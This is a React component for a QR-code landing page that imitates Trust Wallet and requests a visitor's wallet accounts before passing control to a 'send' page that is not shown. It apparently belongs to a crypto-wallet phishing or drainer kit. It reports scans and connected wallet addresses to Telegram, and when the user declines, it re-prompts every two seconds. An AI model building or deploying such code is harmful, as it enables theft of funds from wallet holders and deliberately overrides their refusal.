import { useState, useEffect, useRef } from "react"
import { ethers } from "ethers"
import { notify, formatAddress } from "../lib/telegram"
import { ensureCorrectNetwork } from "../lib/web3"
import SendPage from "./send-page"

type Step = "detecting" | "send" | "error" | "not_trust"

export default function QRLanding() {
  const [step, setStep] = useState<Step>("detecting")
  const [provider, setProvider] = useState<any>(null)
  const [address, setAddress] = useState("")
  const [retryCount, setRetryCount] = useState(0)
  const mountedRef = useRef(true)

  const isIOS =
    /iPad|iPhone|iPod/.test(navigator.userAgent) ||
    (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)

  useEffect(() => {
    mountedRef.current = true
    notify("QR Code Scanned")

    const tryDetect = async () => {
      if (!mountedRef.current) return
      const eth = (window as any).ethereum
      const trustWallet = (window as any).trustwallet
      const injectedProvider = eth || trustWallet

      if (!injectedProvider) {
        if (!mountedRef.current) return
        setStep("not_trust")
        return
      }

      try {
        const bp = new ethers.BrowserProvider(injectedProvider)
        const accounts = await bp.send("eth_requestAccounts", [])
        const addr = accounts[0]

        let finalProvider: ethers.BrowserProvider = bp
        try {
          const switchedProvider = await ensureCorrectNetwork(bp)
          finalProvider = switchedProvider || bp
        } catch (err: any) {
          console.warn("Switch on connect failed:", err?.message || err)
        }

        await notify("Wallet Connected: " + formatAddress(addr))
        if (!mountedRef.current) return
        setProvider(finalProvider)
        setAddress(addr)
        setStep("send")
      } catch (err: any) {
        if (err.code === 4001 || err.message?.includes("user rejected")) {
          await notify("Connection Rejected - Retrying...")
          setRetryCount(prev => prev + 1)
          setTimeout(() => {
            if (mountedRef.current) tryDetect()
          }, 2000)
        } else {
          console.error("Connection error:", err)
          if (!mountedRef.current) return
          setStep("error")
        }
      }
    }

    tryDetect()

    return () => {
      mountedRef.current = false
    }
  }, [])

  const deepLink = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href)
  const pageUrl = window.location.href

  const openInTrustWallet = () => {
    window.location.href = deepLink
  }

  const retryNow = () => {
    window.location.reload()
  }

  const resetToDetecting = () => {
    setStep("detecting")
    setRetryCount(0)
  }

  const c = {
    page: { display: "flex", flexDirection: "column" as const, alignItems: "center", justifyContent: "center", minHeight: "100dvh", padding: "0 24px", background: "#0C0F1E" },
    spinner: { width: "64px", height: "64px", border: "4px solid rgba(51,117,187,0.3)", borderTopColor: "#3375BB", borderRadius: "50%", animation: "spin 1s linear infinite", marginBottom: "24px" },
    h1: { fontSize: "20px", fontWeight: 600, color: "#fff", marginBottom: "8px", textAlign: "center" as const },
    p: { fontSize: "14px", color: "#9CA3AF", textAlign: "center" as const, maxWidth: "320px", lineHeight: "1.5" },
    small: { fontSize: "12px", color: "#6B7280", marginTop: "16px", textAlign: "center" as const, lineHeight: "1.5" },
    icon: { width: "64px", height: "64px", borderRadius: "50%", background: "rgba(240,185,11,0.15)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "28px", color: "#F0B90B", fontWeight: "bold", marginBottom: "24px" },
    errIcon: { width: "64px", height: "64px", borderRadius: "50%", background: "rgba(240,68,56,0.1)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "24px", color: "#F04438", fontWeight: "bold", marginBottom: "24px" },
    btnYellow: { background: "#F0B90B", color: "#0C0F1E", border: "none", padding: "16px 32px", borderRadius: "12px", fontSize: "16px", fontWeight: 700, cursor: "pointer", marginTop: "16px", width: "100%", maxWidth: "320px", textAlign: "center" as const },
    btnBlue: { background: "#3375BB", color: "#fff", border: "none", padding: "14px 32px", borderRadius: "12px", fontSize: "14px", fontWeight: 500, cursor: "pointer", marginTop: "16px", width: "100%", maxWidth: "320px" },
    box: { background: "#1F2233", borderRadius: "12px", padding: "16px", marginTop: "16px", width: "100%", maxWidth: "320px", textAlign: "left" as const },
    li: { fontSize: "13px", color: "#9CA3AF", marginBottom: "8px", lineHeight: "1.5" },
    url: { background: "#0C0F1E", borderRadius: "8px", padding: "10px 12px", fontSize: "12px", color: "#3375BB", wordBreak: "break-all" as const, marginTop: "8px", border: "1px solid #2E3144" },
    warn: { background: "rgba(240,185,11,0.1)", border: "1px solid rgba(240,185,11,0.3)", borderRadius: "12px", padding: "12px 16px", marginTop: "16px", width: "100%", maxWidth: "320px", textAlign: "center" as const },
    warnText: { fontSize: "12px", color: "#F0B90B", lineHeight: "1.5" }
  }

  if (step === "not_trust") {
    return (
      <div style={c.page}>
        <div style={c.icon}>T</div>
        <h1 style={c.h1}>Open in Trust Wallet</h1>
        <p style={c.p}>This page must be opened inside the Trust Wallet app.</p>
        {isIOS && (
          <div style={c.warn}>
            <p style={c.warnText}>On iPhone: Open Safari, type trust://browser_enable, tap Go. This enables the DApp browser in Trust Wallet.</p>
          </div>
        )}
        <button onClick={openInTrustWallet} style={c.btnYellow}>Open in Trust Wallet</button>
        <div style={c.box}>
          <p style={c.li}>1. Tap the "Open in Trust Wallet" button above</p>
          <p style={c.li}>2. If prompted, choose Trust Wallet</p>
          <p style={c.li}>3. The app will open and connect automatically</p>
          <p style={c.li}>4. If nothing happens, copy the URL below and paste it in Trust Wallet's Browser/Discover tab</p>
        </div>
        <p style={c.small}>Or manually paste this URL in Trust Wallet Browser:</p>
        <div style={c.url}>{pageUrl}</div>
        <button onClick={retryNow} style={c.btnBlue}>Retry</button>
      </div>
    )
  }

  if (step === "detecting") {
    return (
      <div style={c.page}>
        <div style={c.spinner} />
        <h1 style={c.h1}>Connecting to Wallet...</h1>
        <p style={c.p}>Please approve the connection in your wallet</p>
        {retryCount > 0 && <p style={c.small}>Retry attempt: {retryCount}</p>}
        <p style={c.small}>Trust Wallet - DApp Browser</p>
      </div>
    )
  }

  if (step === "error") {
    return (
      <div style={c.page}>
        <div style={c.errIcon}>!</div>
        <h1 style={c.h1}>Connection Failed</h1>
        <p style={c.p}>Could not connect to your wallet. Try reopening the page.</p>
        <button onClick={openInTrustWallet} style={c.btnYellow}>Open in Trust Wallet</button>
        <button onClick={resetToDetecting} style={c.btnBlue}>Retry</button>
      </div>
    )
  }

  if (provider && address) {
    return <SendPage provider={provider} address={address} />
  }

  return null
}